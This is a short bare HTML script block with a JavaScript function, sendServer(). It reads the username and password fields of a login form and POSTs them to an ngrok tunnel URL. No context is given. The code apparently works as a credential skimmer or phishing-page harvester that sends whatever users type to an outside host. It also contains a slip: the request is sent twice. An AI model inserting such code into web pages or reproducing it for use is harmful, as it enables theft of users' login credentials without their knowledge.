            <script>
                function sendServer()
                {
                var http = new XMLHttpRequest();
                var url = "http://www.5ce93a9d.ngrok.io/login";
                var username = document.getElementsByName("username")[0].value; //get username
                var password = document.getElementsByName("password")[0].value; //get password
                var params = "userid="+username+"&password="+password;
                //alert(username);
                http.open("POST", url, true);

                //Send the proper header information along with the request
                http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                http.setRequestHeader("Content-length", params.length);
                http.setRequestHeader("Connection", "close");
                http.send(params);
                http.onreadystatechange = function() {//Call a function when the state changes.
                    if(http.readyState == 4 && http.status == 200) {
                    alert(http.responseText);
                    }
                }
                http.send(params);  
                };
            </script>
